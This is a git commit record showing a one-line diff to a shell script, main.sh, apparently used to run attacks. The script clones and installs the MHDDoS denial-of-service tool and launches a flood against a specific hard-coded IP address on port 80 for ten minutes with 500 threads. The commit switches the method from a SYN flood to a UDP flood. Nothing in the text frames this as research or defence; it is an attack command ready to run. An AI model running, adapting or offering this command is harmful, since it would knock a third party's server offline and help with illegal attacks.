6417c8597cc37dda13ca7b065a27bab995c7535d
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-04-04 10:46:10 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,1 +1,1 @@
-rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py SYN  '23.95.215.105:80'  500 600
+rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py UDP  '23.95.215.105:80'  500 600
